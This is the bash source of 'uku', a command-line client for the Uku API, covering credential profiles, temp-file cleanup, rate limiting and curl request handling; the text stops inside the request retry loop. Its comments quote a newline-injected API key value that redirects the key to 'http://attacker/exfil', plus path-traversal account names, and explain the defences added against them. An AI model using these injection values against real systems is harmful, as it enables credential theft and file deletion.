#!/usr/bin/env bash
# uku — the Uku command-line client.
# A thin, dependency-light wrapper over the Uku public API v3
# (https://app.getuku.com/api/v3). Gives terminals, scripts, CI, and coding
# agents (Claude Code, Cursor, Codex) a native way to operate a firm's Uku data
# within the exact permissions of the API key you hand it.
#
# Design goals:
#   • Portable: bash + curl only. `jq` is used for pretty output if present,
#     never required (raw JSON is always available with --json).
#   • Safe: credentials stored 0600; the key is never printed; writes are
#     deliberate (a non-interactive write needs --yes); money needs an All key,
#     which the API — not this CLI — enforces.
#   • Agent-friendly: --json is the default when stdout is not a TTY, stable
#     exit codes, and `uku api` passes through to any endpoint.
set -euo pipefail

UKU_VERSION="0.4.0"
UKU_BASE_DEFAULT="https://app.getuku.com"
UKU_CONFIG_HOME="${UKU_CONFIG_HOME:-${XDG_CONFIG_HOME:-$HOME/.config}/uku}"
UKU_PROFILE_DIR="$UKU_CONFIG_HOME/profiles"   # one file per account (0600)
UKU_ACTIVE_FILE="$UKU_CONFIG_HOME/active"     # holds the active profile name
UKU_ACCOUNT_CLI=""                            # set by the global --account flag

# ── Exit codes (stable) ──────────────────────────────────────────────
EX_OK=0        # success
EX_USAGE=1     # bad usage / unknown command
EX_AUTH=2      # not authenticated / auth rejected
EX_API=3       # API returned an error status (4xx/5xx)
EX_CONFIRM=4   # a deliberate write was refused (no --yes, no TTY)
EX_NET=5       # network error / could not reach the API (retry-worthy)
EX_CONFLICT=6  # HTTP 412 — the record changed under you. Re-read, re-apply. NEVER auto-retried.

# ── Small helpers ────────────────────────────────────────────────────
_is_tty()  { [ -t 1 ]; }
_color()   { if _is_tty && [ -z "${NO_COLOR:-}" ]; then printf '\033[%sm%s\033[0m' "$1" "$2"; else printf '%s' "$2"; fi; }
_bold()    { _color "1" "$1"; }
_green()   { _color "32" "$1"; }
_red()     { _color "31" "$1"; }
_dim()     { _color "2" "$1"; }
info()  { [ "${UKU_QUIET:-0}" = "1" ] && return 0; printf '%s %s\n' "$(_green '✓')" "$1" >&2; }
warn()  { printf '%s %s\n' "$(_color 33 '!')" "$1" >&2; }
# die MESSAGE [EXIT] [REMEDY [ARG…]] — the only way this CLI fails.
# The remedy is a second line ("→ run: uku auth login") on stderr, and the
# `hint` field of the --agent error envelope. Where no honest next step exists,
# pass none: an invented remedy is worse than silence.
die()   {
  local msg="$1" code="${2:-$EX_USAGE}"
  shift; [ "$#" -gt 0 ] && shift
  local hint=""
  [ "$#" -gt 0 ] && hint="$(_bc_render "$@")"
  if [ "${UKU_AGENT:-0}" = "1" ]; then _agent_error "$msg" "$code" "$hint"; exit "$code"; fi
  printf '%s %s\n' "$(_red '✗')" "$msg" >&2
  _hint_line "$hint"
  exit "$code"
}
have()  { command -v "$1" >/dev/null 2>&1; }
# ── the jq-degradation rule ──────────────────────────────────────────
# jq is optional (README: "used for pretty tables when present, but is never
# required"). Every `have jq` branch in this file picks one of two responses,
# and the choice is not a coin flip — it follows from what jq's absence costs:
#
#   • a DEGRADED SHAPE warns and continues. Fewer rows (--all can't combine
#     pages), more keys (--fields can't select down), a plain dump instead of
#     a table — the data is still correct, just shaped differently. Nothing
#     is damaged, so refusing would only make the CLI less useful for exactly
#     the box that needs it most.
#   • an UNKEEPABLE SAFETY PROMISE refuses outright. --skip-existing exists to
#     stop a batch from creating a duplicate; without jq it cannot compare the
#     match field exactly, and proceeding would mean guessing at the one
#     thing the flag promises never to guess at. A wrong guess creates data
#     that then has to be found and cleaned up by hand — worse than refusing.
#
# So: can the command still tell the truth, just less prettily? Warn and
# continue. Would continuing require guessing at something the caller was
# explicitly promised would never be guessed? Die instead. Tested end to end,
# including the promise NOT holding in one place (uku doctor --json): see
# tests/cases/no-jq.sh.
# _need_val FLAG [VALUE …] — die clearly instead of a silent `shift 2` death.
_need_val() { [ "$#" -ge 2 ] || die "flag $1 needs a value" "$EX_USAGE"; }

# ── temp-file safety net ──────────────────────────────────────────────
# Every temp file this run makes — the 0600 auth-header config, the response
# and header buffers, the request body, the --all accumulator, the batch input
# — lives inside ONE private directory, and the exit/signal traps remove that
# directory. One path in, one path out.
#
# It used to be an accumulator: _mktemp appended to UKU_TMPFILES and _cleanup
# ran `rm -f $UKU_TMPFILES`. It never deleted a single file. Every call site
# was `tmp="$(_mktemp)"`, and a command substitution is a SUBSHELL, so the
# append happened to a copy and the parent's variable stayed empty — the
# EXIT/INT/TERM/HUP traps were decorative, and the happy path was clean only
# because do_request calls _rmtmp explicitly. Measured 2026-07-29: a network
# error left `header = "X-API-Key: uku_live_…"` behind (0600, in $TMPDIR), and
# a --dry-run — the thing an agent runs before every write — left the key
# config AND the request body with the client's data in it. macOS clears
# /var/folders only on reboot, so those files sat there for days.
#
# Hence the shape below: _mktemp is a SETTER, never `$(…)`. A setter cannot be
# defeated by a subshell, and it is what lets the run directory be created in
# the shell the trap actually runs in. It also retires the unquoted
# `rm -f $UKU_TMPFILES`, which would have split a path on a space in $TMPDIR.
UKU_RUNDIR=""
_rundir() {
  [ -n "$UKU_RUNDIR" ] && return 0
  local d="${TMPDIR:-/tmp}"; d="${d%/}"
  # An explicit template, not a bare `mktemp -d`: macOS's mktemp ignores
  # $TMPDIR and always uses /var/folders, so a bare call would put the key
  # config somewhere the caller never named and no test could see.
  UKU_RUNDIR="$(mktemp -d "$d/uku.XXXXXXXX")" || die "cannot create a temp directory in $d" "$EX_USAGE"
  chmod 700 "$UKU_RUNDIR" 2>/dev/null || true
  return 0
}
# _mktemp VAR — create a temp file in this run's directory and put its path in
# VAR. Call it as `_mktemp tmp`, never as `tmp="$(_mktemp)"`.
_mktemp() {
  _rundir
  local __t
  __t="$(mktemp "$UKU_RUNDIR/f.XXXXXX")" || die "cannot create a temp file" "$EX_USAGE"
  printf -v "$1" '%s' "$__t"
}
# _rmtmp FILE… — delete now, so a long-running loop (a --batch of 500 lines =
# 2000 request buffers) doesn't hold every response of the run on disk until
# the process exits. The traps stay the backstop for the rest.
_rmtmp()   { local f; for f in "$@"; do [ -n "$f" ] || continue; rm -f "$f" 2>/dev/null || true; done; return 0; }
_cleanup() { [ -n "$UKU_RUNDIR" ] && rm -rf "$UKU_RUNDIR" 2>/dev/null; return 0; }
# A signal trap whose handler RETURNS resumes the script where it was
# interrupted — so `trap _cleanup INT` quietly made Ctrl-C a no-op: uku swept
# its temp files and carried straight on. Measured 2026-07-28: SIGINT during a
# 10-line batch cost nothing, all 10 were still created. That is intolerable
# for bulk writes, where Ctrl-C is how a person says stop. So: clean up, drop
# the trap, and re-raise the signal with its default disposition, which both
# really stops us and reports the conventional 128+signal.
# HUP is included on purpose — a closed lid or a lost terminal must stop the
# writes, not orphan a run that keeps creating records.
_on_signal() {
  _cleanup
  # If a batch is mid-flight, the one thing the user needs at this exact
  # moment is how to pick it up again. The ledger is already complete up to
  # the last record that landed (every create is appended before the next line
  # is read), so this is always safe advice.
  if [ "${UKU_BATCH_RUNNING:-0}" = "1" ]; then
    printf '\n  %s\n' "interrupted — ${UKU_BATCH_DONE:-0} record(s) created and recorded in the ledger." >&2
    _hint_line "${UKU_BATCH_RESUME_HINT:-uku batch list}"
  fi
  trap - "$1" EXIT; kill -s "$1" $$
}
trap _cleanup EXIT
trap '_on_signal INT'  INT
trap '_on_signal TERM' TERM
trap '_on_signal HUP'  HUP

require_curl() { have curl || die "curl is required but not installed." "$EX_USAGE"; }

# ── Config / accounts ────────────────────────────────────────────────
# Uku lets one person hold several companies under a single login — a real
# "main" firm plus a sandbox to rehearse changes (price edits, invoices) before
# committing them for real. The CLI mirrors that: each account is a named
# profile file under ~/.config/uku/profiles/<name> (mode 0600), and `active`
# names the current one. `--account <name>` targets one command; env vars
# (UKU_API_KEY + UKU_COMPANY) override everything for CI/agents.
#
# Files are PARSED, never sourced — a tampered profile is data, not code.

# _profile_path NAME → the profile file path for NAME, or nothing (exit 1) if
# NAME fails validation. S3/S7: save_profile validated on WRITE, but every
# read/remove/switch caller (`account use`, `account remove`, `auth logout`,
# `load_creds`) built this path from an unvalidated name — the exact bug class
# that shipped as `batch show ../profiles/default` in v0.3.0, whose fix went
# into `_ledger_file` itself for precisely this reason: caller-side-only
# validation is what let it in the first time. The check now lives on this
# side too, once, so no future call site can forget it. Proven exploit before
# this fix: `uku account remove ../../../../victim/precious.txt` deleted the
# named file outright.
_profile_path() { _valid_name "$1" || return 1; printf '%s/%s' "$UKU_PROFILE_DIR" "$1"; }
# _require_valid_name NAME — dies with the CLI's usual usage error on a bad
# name. Call this directly as its own statement (never inside a `$(...)`,
# where `die`'s `exit` would only end the subshell and leave the caller none
# the wiser) at every point an account name arrives fresh from the user this
# invocation — the global `--account` flag's parse site, `account use`,
# `account remove`. It duplicates the check `_profile_path` already makes
# internally on purpose: this call site is what gives the user a clear
# message and an immediate stop; `_profile_path`'s own check is the backstop
# that still fails closed if a future call site forgets to call this first.
# Names that instead arrive as *persisted state* (the `active` file's
# content) go through `active_profile`, which sanitizes on read rather than
# dying, because a poisoned file is a state to recover from, not a usage
# mistake to reject.
_require_valid_name() {
  _valid_name "$1" || die "Invalid account name: '$1' (use letters, digits, . _ - — not '.' or '..')." "$EX_USAGE"
}
# POSIX class, not an a-z range: bracket ranges are locale/collation-dependent
# (en_US.UTF-8 makes [a-z] skip letters), which silently rejected valid names.
# `.` and `..` are explicitly rejected (S10a): both consist only of allowed
# characters, so the character-class test alone accepted them, and either one
# resolves _profile_path to the profile directory itself or its parent.
_valid_name() {
  case "$1" in
    ""|.|..) return 1 ;;
    *[![:alnum:]._-]*) return 1 ;;
    *) return 0 ;;
  esac
}

# read one KEY from a profile file (grep/sed, no sourcing)
_profile_get() {
  local file="$1" key="$2" line
  [ -f "$file" ] || return 0
  line="$(grep -m1 "^$key=" "$file" 2>/dev/null || true)"
  # strip KEY= and one layer of surrounding quotes
  line="${line#*=}"; line="${line%\"}"; line="${line#\"}"
  printf '%s' "$line"
}

active_profile() {
  local a
  if [ -f "$UKU_ACTIVE_FILE" ]; then a="$(head -n1 "$UKU_ACTIVE_FILE" 2>/dev/null | tr -d '[:space:]')"; else a="default"; fi
  # S7: this file is PERSISTED STATE, not a fresh argument — every command that
  # follows load_creds trusts whatever name comes back. Before this check, one
  # `uku account use ../../../../victim/x` call poisoned it permanently: every
  # later command (including ones with no `--account` flag at all) then read
  # its credentials from an attacker-chosen path. Refuse to trust a bad value
  # silently; recover to 'default' instead of failing every command that
  # follows a single act of tampering (or an older, unpatched CLI's mistake).
  if ! _valid_name "$a"; then
    warn "stored active-account name '$a' is invalid — ignoring, falling back to 'default'. Run: uku account use <name>"
    a="default"
  fi
  printf '%s' "$a"
}

# Resolve credentials into UKU_BASE / UKU_COMPANY / UKU_KEY / UKU_PROFILE.
# Precedence: --account flag → env (both key+company) → active profile.
load_creds() {
  # snapshot the environment BEFORE touching any file (fixes cross-account bleed)
  local env_key="${UKU_API_KEY:-}" env_company="${UKU_COMPANY:-}" env_base="${UKU_BASE_URL:-}"
  UKU_BASE="$UKU_BASE_DEFAULT"; UKU_COMPANY=""; UKU_KEY=""; UKU_PROFILE=""

  if [ -n "$UKU_ACCOUNT_CLI" ]; then
    UKU_PROFILE="$UKU_ACCOUNT_CLI"
    local f; f="$(_profile_path "$UKU_PROFILE")"
    [ -f "$f" ] || die "No such account: $UKU_PROFILE" "$EX_AUTH" @@account.list
    # Same base precedence as the other two branches: what the profile stored,
    # then UKU_BASE_URL, then the default (and --base still wins over all three,
    # below). This branch used to read the profile only, so --account silently
    # ignored the env var that every other path honours.
    UKU_BASE="$(_profile_get "$f" UKU_BASE)"; UKU_BASE="${UKU_BASE:-${env_base:-$UKU_BASE_DEFAULT}}"
    UKU_COMPANY="$(_profile_get "$f" UKU_COMPANY)"
    UKU_KEY="$(_profile_get "$f" UKU_KEY)"
  elif [ -n "$env_key" ] && [ -n "$env_company" ]; then
    # a complete env identity wins outright — the CI / agent path
    UKU_PROFILE="env"
    UKU_BASE="${env_base:-$UKU_BASE_DEFAULT}"; UKU_COMPANY="$env_company"; UKU_KEY="$env_key"
  else
    UKU_PROFILE="$(active_profile)"
    local f; f="$(_profile_path "$UKU_PROFILE")"
    if [ -f "$f" ]; then
      UKU_BASE="$(_profile_get "$f" UKU_BASE)"; UKU_BASE="${UKU_BASE:-$UKU_BASE_DEFAULT}"
      UKU_COMPANY="$(_profile_get "$f" UKU_COMPANY)"
      UKU_KEY="$(_profile_get "$f" UKU_KEY)"
    fi
    # A partial env identity welds an env value onto the profile's other half —
    # warn once, so an env key can't silently talk to a stored profile's company (N13).
    if [ -f "$f" ]; then
      if { [ -n "$env_key" ] && [ -z "$env_company" ]; } || { [ -z "$env_key" ] && [ -n "$env_company" ]; }; then
        warn "mixing env credentials with stored account '$UKU_PROFILE' — set BOTH UKU_API_KEY and UKU_COMPANY, or neither."
      fi
    fi
    [ -n "$env_company" ] && UKU_COMPANY="$env_company"
    [ -n "$env_key" ] && UKU_KEY="$env_key"
    [ -n "$env_base" ] && UKU_BASE="$env_base"
  fi
  [ -n "${UKU_BASE_CLI:-}" ] && UKU_BASE="$UKU_BASE_CLI"
  return 0
}

# save_profile NAME BASE COMPANY KEY  — writes a 0600 profile file safely.
save_profile() {
  local name="$1" base="$2" company="$3" key="$4"
  _valid_name "$name" || die "Invalid account name: '$name' (use letters, digits, . _ -)" "$EX_USAGE"
  # A profile file is line-based too, so the same break that injects a curl
  # directive also injects a bogus UKU_KEY= line here. Checked at the point of
  # writing, not at the point of reading, so no such value ever reaches disk —
  # including via `--key-stdin < a-file-with-a-newline-in-the-middle`.
  _check_cred_line "the base URL" "$base"
  _check_cred_line "the company id" "$company"
  _check_cred_line "the API key" "$key"
  mkdir -p "$UKU_PROFILE_DIR"; chmod 700 "$UKU_CONFIG_HOME" "$UKU_PROFILE_DIR" 2>/dev/null || true
  local f; f="$(_profile_path "$name")"
  ( umask 077
    { printf '# Uku CLI account "%s" — private (0600). Do not share.\n' "$name"
      printf 'UKU_BASE=%s\n' "$base"
      printf 'UKU_COMPANY=%s\n' "$company"
      printf 'UKU_KEY=%s\n' "$key"
    } > "$f" )
  chmod 600 "$f"
}

set_active() { mkdir -p "$UKU_CONFIG_HOME"; printf '%s\n' "$1" > "$UKU_ACTIVE_FILE"; }

# After removing account NAME: if it was active, hand off to a remaining profile
# instead of dangling at a nonexistent 'default' (N12).
_reassign_active() {
  [ "$(active_profile)" = "$1" ] || return 0
  local next; next="$(list_profiles | head -n1)"
  if [ -n "$next" ]; then set_active "$next"; info "Active account → '$next'."
  else rm -f "$UKU_ACTIVE_FILE" 2>/dev/null || true; fi
}

# "no accounts" is an ANSWER, not a failure. The loop's status used to be the
# last `[ -f … ]`, so an empty (or glob-unmatched) profile dir returned 1 — and
# under `set -euo pipefail` `next="$(list_profiles | head -n1)"` in
# _reassign_active then aborted the script, AFTER "Removed account 'x'." had
# already been printed. Removing your last account succeeded and exited 1.
list_profiles() {
  [ -d "$UKU_PROFILE_DIR" ] || return 0
  local f; for f in "$UKU_PROFILE_DIR"/*; do [ -f "$f" ] && basename "$f"; done 2>/dev/null
  return 0
}

need_auth() {
  [ -n "${UKU_COMPANY:-}" ] && [ -n "${UKU_KEY:-}" ] && return 0
  die "Not signed in for account '$UKU_PROFILE' (or set UKU_COMPANY + UKU_API_KEY)." "$EX_AUTH" @@auth.login
}

# ── HTTP core ────────────────────────────────────────────────────────
# do_request METHOD PATH [DATA]  →  sets REPLY_BODY + REPLY_STATUS in the
# CURRENT shell (never call this inside $( ) — a subshell would swallow the
# status). Adds the two auth headers.
REPLY_BODY=""
REPLY_STATUS=0
REPLY_HEADERS=""
REPLY_PATH=""    # the path the last request went to — a 412 remedy needs to
                 # name the record to re-read, not just say "re-read it"
REPLY_METHOD=""  # and its METHOD, because a 5xx remedy is not the same
                 # sentence for a read as it is for a write
# curl -K config values live inside "…"; backslash-escape \ and " so a key or
# company containing them can't silently corrupt the header (T12).
_cfg_esc() { local s="$1"; s="${s//\\/\\\\}"; s="${s//\"/\\\"}"; printf '%s' "$s"; }
# …but no amount of escaping reaches across a LINE BREAK: the -K grammar is
# line-based, so a newline inside a credential ends the header directive and
# starts a new one. Measured 2026-07-29 with
# UKU_API_KEY=$'sekret-key\nurl = http://attacker/exfil': curl performed a
# SECOND transfer to the attacker's host carrying the live X-API-Key, and the
# user saw nothing. --header values have been checked for this since T12
# (_check_header_arg); the credentials themselves were not. The env path and a
# --key-stdin file are both easy carriers — _trim only strips the ENDS, so a
# newline in the middle of a key file survives. A profile file happens to be
# safe (_profile_get greps one line), but that is luck, not design.
#
# Two call sites, deliberately: before the -K file is written (every path that
# sends), and in save_profile (so such a value never reaches disk at all).
# No remedy slug — there is no command that fixes a broken credential, and an
# invented one would be worse than silence.
_check_cred_line() { # LABEL VALUE
  case "$2" in
    *$'\n'*|*$'\r'*)
      die "$1 must be a single line — a line break in it would inject a directive into the curl config the credentials are passed through. Nothing was sent or stored." "$EX_USAGE" ;;
  esac
}

# _reply_header NAME — the trimmed value of one response header.
# Names are case-insensitive per RFC 9110 (HTTP/2 sends them lowercased, so
# "ETag" arrives as "etag"), the dump is CRLF-terminated, and a redirect leaves
# several header blocks in one file — so: lowercase both sides, strip CR, and
# keep the LAST match.
_reply_header() {
  [ -n "$REPLY_HEADERS" ] || return 0
  printf '%s\n' "$REPLY_HEADERS" | tr -d '\r' | awk -v want="$1" '
    BEGIN { want = tolower(want); val = "" }
    { i = index($0, ":"); if (i < 2) next
      k = tolower(substr($0, 1, i - 1))
      if (k == want) val = substr($0, i + 1) }
    END { gsub(/^[ \t]+/, "", val); gsub(/[ \t]+$/, "", val); if (val != "") print val }'
}

# ── Rate limits — the server declares them, we read them ──────────────
# Every response carries X-RateLimit-{Limit,Remaining,Reset,Tier}. Reset is
# epoch seconds. Reads and writes are metered in SEPARATE buckets (the `Tier`
# header names the server's), so state is filed per request class — otherwise a
# cheap `clients list` would keep resetting what we believe about the write
# budget. No hardcoded local budget: guessing "30/min" would be wrong the day
# the server changes.
UKU_RL_MAX_WAIT="${UKU_RL_MAX_WAIT:-60}"   # never block longer than this; refuse instead
_rl_file() { printf '%s/ratelimit-%s-%s' "$UKU_CONFIG_HOME" "${UKU_PROFILE:-default}" "$1"; }
_rl_class() { case "$1" in GET|HEAD) printf 'read' ;; *) printf 'write' ;; esac; }
_rl_capture() {
  local lim rem rst tier f
  lim="$(_reply_header X-RateLimit-Limit)";     rem="$(_reply_header X-RateLimit-Remaining)"
  rst="$(_reply_header X-RateLimit-Reset)";     tier="$(_reply_header X-RateLimit-Tier)"
  [ -n "$rem$rst" ] || return 0
  f="$(_rl_file "$(_rl_class "$1")")"
  mkdir -p "$UKU_CONFIG_HOME" 2>/dev/null || return 0
  ( umask 077; printf 'limit=%s\nremaining=%s\nreset=%s\ntier=%s\n' "$lim" "$rem" "$rst" "$tier" > "$f" ) 2>/dev/null || true
  chmod 600 "$f" 2>/dev/null || true
  return 0
}
# _rl_when EPOCH — human time for a Reset value (BSD date first, then GNU).
_rl_when() {
  case "$1" in ''|*[!0-9]*) printf 'unknown' ; return 0 ;; esac
  date -u -r "$1" +%H:%M:%SZ 2>/dev/null || date -u -d "@$1" +%H:%M:%SZ 2>/dev/null || printf 'epoch %s' "$1"
}
# _rl_wait_secs — seconds until the Reset in the CURRENT response, or "" .
_rl_wait_secs() {
  local rst now
  rst="$(_reply_header X-RateLimit-Reset)"
  case "$rst" in ''|*[!0-9]*) return 0 ;; esac
  now="$(date +%s 2>/dev/null)" || return 0
  local w=$(( rst - now )); [ "$w" -lt 0 ] && w=0
  printf '%s' "$w"
}
# _rl_write_wait_secs — how many seconds a write must wait before it may be
# sent: 0 = go now. Pure (no sleeping, no dying), because two callers need the
# same answer for different reasons — _pace_write waits on it, and the batch
# loop needs to DECIDE, before it sends, whether to stop the run cleanly and
# leave a resumable ledger. One source of truth, two policies.
_rl_write_wait_secs() {
  local f rem rst now w
  f="$(_rl_file write)"; [ -f "$f" ] || { printf '0'; return 0; }
  rem="$(_profile_get "$f" remaining)"; rst="$(_profile_get "$f" reset)"
  case "$rem" in ''|*[!0-9]*) printf '0'; return 0 ;; esac
  [ "$rem" -gt 0 ] && { printf '0'; return 0; }
  case "$rst" in ''|*[!0-9]*) printf '0'; return 0 ;; esac
  now="$(date +%s 2>/dev/null)" || { printf '0'; return 0; }
  w=$(( rst - now )); [ "$w" -lt 0 ] && w=0
  printf '%s' "$w"
}
# _rl_write_reset — the epoch the write window turns over at (for messages).
_rl_write_reset() { _profile_get "$(_rl_file write)" reset; }
# Pace BEFORE a write: if the last write response said the budget is spent and
# the window has not turned over yet, wait it out rather than spend a 429 —
# because a 429'd write can never be safely retried.
_pace_write() {
  local w rst; w="$(_rl_write_wait_secs)"
  [ "$w" -gt 0 ] || return 0
  rst="$(_rl_write_reset)"
  if [ "$w" -gt "$UKU_RL_MAX_WAIT" ]; then
    die "write rate limit is spent and does not reset for ${w}s (at $(_rl_when "$rst")). Refusing to block that long — nothing was sent. Re-run after then, or raise UKU_RL_MAX_WAIT." "$EX_NET"
  fi
  warn "write rate limit spent — waiting ${w}s for the window to reset ($(_rl_when "$rst"))…"
  sleep "$w"
  return 0
}

# Local ledger of every change (no bodies, no keys) — a receipt for accountants (#6).
_audit() {
  mkdir -p "$UKU_CONFIG_HOME" 2>/dev/null || return 0
  local log="$UKU_CONFIG_HOME/audit.log"
  printf '%s\t%s\t%s\t%s\t%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo -)" \
    "${UKU_PROFILE:-?}" "$1" "$2" "$3" >> "$log" 2>/dev/null || true
  chmod 600 "$log" 2>/dev/null || true
  return 0
}

# The single most expensive client-side mistake by volume: a time-entry write
# carrying `duration` but no `end`. Uku reads "start, no end" as *open a running
# timer*, so instead of logging the duration you asked for it starts a timer —
# and 409s with TIMER_ALREADY_RUNNING when one already runs (14 such failures in
# one day of Rain's audit log, more than 428 and 429 combined). Deliberately an
# explicit, greppable check: generic client-side schema validation is a later wave.
_guard_time_entry() {
  local method="$1" path="$2" data="$3"
  [ -n "$data" ] || return 0
  case "$method" in POST|PATCH|PUT) : ;; *) return 0 ;; esac
  case "${path%%\?*}" in /api/v3/time-entries|/api/v3/time-entries/*) : ;; *) return 0 ;; esac
  local has_dur=0 has_end=0
  if have jq; then
    if printf '%s' "$data" | jq -e 'has("duration") and (.duration != null)' >/dev/null 2>&1; then has_dur=1; fi
    if printf '%s' "$data" | jq -e 'has("end") and (.end != null)' >/dev/null 2>&1; then has_end=1; fi
  else
    # jq is optional — fall back to matching the KEY (not free text), so a
    # description mentioning "end" can't trip the guard.
    if printf '%s' "$data" | grep -Eq '"duration"[[:space:]]*:[[:space:]]*[0-9]'; then has_dur=1; fi
    if printf '%s' "$data" | grep -Eq '"end"[[:space:]]*:[[:space:]]*"'; then has_end=1; fi
  fi
  [ "$has_dur" = "1" ] || return 0
  [ "$has_end" = "0" ] || return 0
  die "this time-entry write sets \"duration\" but no \"end\" — nothing was sent.
    Uku treats a time entry with a start and no end as a RUNNING TIMER, so this
    would open a timer instead of logging the duration, and fail with
    409 TIMER_ALREADY_RUNNING if a timer is already running.
    • To log finished work:      send \"start\" and \"end\" (drop \"duration\").
    • To start a timer on purpose: send \"start\" only (drop \"duration\")." "$EX_USAGE"
}

# _etag_candidates PATH — the GET paths that might carry this write's ETag,
# most specific first.
#
# EMPIRICAL (measured 2026-07-27 against app.getuku.com, contract 41219):
#   GET /contracts/41219            → etag: W/"2026-07-27T09:23:28.783836+00:00"
#   GET /contracts/41219/rows       → NO ETag header at all  (a collection)
#   GET /contracts/41219/rows/66131 → etag: W/"2026-07-27T09:03:29.242577+00:00"
# and the server accepted, respectively: the PARENT contract's ETag for
# `POST /contracts/41219/rows`, and the ROW's own ETag for
# `DELETE /contracts/41219/rows/{row_id}`. So neither "always the parent" nor
# "always the path you wrote to" is right — the rule that holds is: try the most
# specific GETable path, then walk up. The API stays the authority. A static
# "financial paths" table would be wrong anyway: If-Match is declared optional
# on all 18 endpoints that take it, and 428 is declared on nearly every DELETE.
#
# Note the ETag is the resource's own updated_at: adding or removing a contract
# row does NOT bump the parent contract's ETag, and a no-op PATCH does not bump
# it either. Only a real field change does.
_looks_like_id() { case "$1" in ''|*[!0-9a-fA-F-]*) return 1 ;; *[0-9]*) return 0 ;; *) return 1 ;; esac; }
_etag_candidates() {
  local p="${1%%\?*}"; p="${p%/}"
  # trailing action segments are verbs on the resource, not resources
  case "$p" in */send) p="${p%/send}" ;; */mark-paid) p="${p%/mark-paid}" ;; */rotate) p="${p%/rotate}" ;; */undo) p="${p%/undo}" ;; esac
  local out="" up up2
  if _looks_like_id "${p##*/}"; then out="$p"; fi
  up="${p%/*}"
  if [ "$up" != "$p" ] && _looks_like_id "${up##*/}"; then out="$out${out:+ }$up"; fi
  up2="${up%/*}"
  if [ "$up2" != "$up" ] && _looks_like_id "${up2##*/}"; then out="$out${out:+ }$up2"; fi
  printf '%s' "$out"
}

# 428 = PRECONDITION_REQUIRED: the server refused the write for want of an
# If-Match, so NOTHING happened — which makes exactly one automatic resend safe.
# Fetch the current ETag, resend the original request once. Never a loop
# (_UKU_NO_HEAL guards the recursion), and never when the user supplied their
# own --if-match: then the value they chose was rejected and only they can fix it.
_heal_428() {
  local method="$1" path="$2" data="$3"
  if [ -n "${UKU_IF_MATCH:-}" ]; then _UKU_428_SUPPLIED=1; return 1; fi
  local cands; cands="$(_etag_candidates "$path")"
  [ -n "$cands" ] || return 1
  local save_body="$REPLY_BODY" save_status="$REPLY_STATUS" save_hdrs="$REPLY_HEADERS"
  local c etag="" src=""
  for c in $cands; do
    _UKU_NO_HEAL=1 UKU_SOFT=1 do_request GET "$c" || true
    etag=""
    case "$REPLY_STATUS" in 2*) etag="$(_reply_header ETag)" ;; esac
    if [ -n "$etag" ]; then src="$c"; break; fi
  done
  if [ -z "$etag" ]; then
    REPLY_BODY="$save_body"; REPLY_STATUS="$save_status"; REPLY_HEADERS="$save_hdrs"
    return 1
  fi
  # stdout belongs to the caller's JSON — the heal is a stderr/audit-log event only.
  _audit "HEAL428" "$path" "if-match-from=$src"
  if _is_tty; then printf '  %s\n' "$(_dim "428 → re-sent once with If-Match from $src")" >&2; fi
  _UKU_NO_HEAL=1 _UKU_IF_MATCH_SEND="$etag" do_request "$method" "$path" "$data"
  return 0
}

do_request() {
  local method="$1" path="$2" data="${3:-}"
  local url="$UKU_BASE$path"
  REPLY_PATH="$path"
  REPLY_METHOD="$method"
  # Before anything is created or sent: the two values that go into the -K
  # config verbatim must each be one line (see _check_cred_line).
  _check_cred_line "the company id (UKU_COMPANY)" "$UKU_COMPANY"
  _check_cred_line "the API key (UKU_API_KEY)" "$UKU_KEY"
  _guard_time_entry "$method" "$path" "$data"
  case "$method" in GET|HEAD) : ;; *) _pace_write ;; esac
  local tmp cfg hdrf; _mktemp tmp; _mktemp cfg; _mktemp hdrf
  chmod 600 "$cfg" "$hdrf" 2>/dev/null || true
  # Auth headers go through a 0600 curl config file (-K), never argv — so the
  # API key can't be read from `ps` on a multi-user host. --header values get the
  # same treatment: a user-supplied header may itself be a credential.
  local im="${_UKU_IF_MATCH_SEND:-${UKU_IF_MATCH:-}}"
  { printf 'header = "X-Uku-Company: %s"\n' "$(_cfg_esc "$UKU_COMPANY")"
    printf 'header = "X-API-Key: %s"\n' "$(_cfg_esc "$UKU_KEY")"
    local h
    for h in ${UKU_HEADERS[@]+"${UKU_HEADERS[@]}"}; do printf 'header = "%s"\n' "$(_cfg_esc "$h")"; done
    if [ -n "$im" ]; then printf 'header = "If-Match: %s"\n' "$(_cfg_esc "$im")"; fi
  } > "$cfg"
  local -a args=(-sS -X "$method" "$url" -K "$cfg"
    -H "Accept: application/json"
    -H "User-Agent: uku-cli/$UKU_VERSION"
    --connect-timeout 10 --max-time 120
    -D "$hdrf"
    -w '%{http_code}' -o "$tmp")
  case "$url" in https://*) args+=(--proto '=https' --tlsv1.2) ;; esac  # pin TLS for https bases; allow http dev base
  # NO `--retry`: curl's own retry counts 408/429/5xx as retryable and re-sends
  # them itself, so a rate-limited read hit the limiter three times before the
  # CLI's polite "read X-RateLimit-Reset, wait, retry once" path was even
  # reachable — the client hammering the very budget it is trying to respect.
  # Resilience to a flaky link is kept, but as a TRANSPORT-only retry below:
  # once, and never on an HTTP status.
  # Request body also goes to a 0600 file, off argv — invoice/client PII isn't in `ps` either (#2).
  if [ -n "$data" ]; then
    local body; _mktemp body; chmod 600 "$body" 2>/dev/null || true
    printf '%s' "$data" > "$body"
    args+=(-H "Content-Type: application/json" --data-binary @"$body")
  fi
  # --dry-run: show exactly what would be sent (headers masked), send nothing (#5).
  if [ "${UKU_DRY:-0}" = "1" ]; then
    printf '%s\n' "$(_bold '[dry-run] would send:')" >&2
    printf '  %s %s\n  %s\n' "$method" "$url" \
      "$(_dim "X-Uku-Company: $UKU_COMPANY  ·  X-API-Key: $(_mask_key "$UKU_KEY")")" >&2
    for h in ${UKU_HEADERS[@]+"${UKU_HEADERS[@]}"}; do printf '  %s\n' "$(_dim "$h")" >&2; done
    if [ -n "$im" ]; then printf '  %s\n' "$(_dim "If-Match: $im")" >&2; fi
    printf '  %s\n' "$([ -n "$data" ] && printf 'body: %s' "$data" || printf 'no body')" >&2
    exit "$EX_OK"
  fi
  # Transport-only retry. These curl exit codes all mean "the request did not
  # complete on the wire", never "the server answered": 6 could not resolve the
  # host · 7 could not connect · 28 timed out · 35 TLS handshake failed ·
  # 52 empty reply · 56 error receiving data. An idempotent read may be
  # re-issued once on any of them. A WRITE never is — an interrupted POST may
  # still have been applied, which is the whole doctrine of this CLI.
  local rc=0 attempt=1
  while :; do
    rc=0
    REPLY_STATUS="$(curl "${args[@]}")" || rc=$?
